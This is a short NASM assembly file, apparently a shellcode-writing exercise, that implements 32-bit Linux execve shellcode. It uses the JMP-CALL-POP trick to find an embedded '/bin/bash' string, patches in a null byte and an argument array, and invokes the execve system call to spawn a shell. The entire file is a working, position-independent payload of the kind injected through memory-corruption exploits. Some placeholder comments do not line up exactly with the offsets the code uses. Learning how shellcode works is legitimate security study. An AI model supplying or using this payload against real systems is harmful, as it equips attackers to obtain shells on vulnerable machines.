; Filename: execve.nasm
; Author: Cole Strickler





global _start


section .text

_start:


	; JMP-CALL-POP technique

	jmp short call_shellcode


shellcode:
	
	pop esi
	
	; zero a register for use 
	xor ebx, ebx
	; mov 0x0 into 'A' place
	mov byte [esi +9], bl
	; esi contains address of /bin/bash, overwrite BBBB
	mov dword [esi +10], esi
	; 0 into CCCC
	mov dword [esi +14], ebx

	; all is set for execve function call
	; now load into correct registers for system call
	lea ebx, [esi]
	lea ecx, [esi +10]
	lea edx, [esi +14]

	
	; syscall
	xor eax, eax
	mov al, 0xb
	int 0x80



call_shellcode:

	call shellcode
	message db "/bin/bash/ABBBBCCCC"
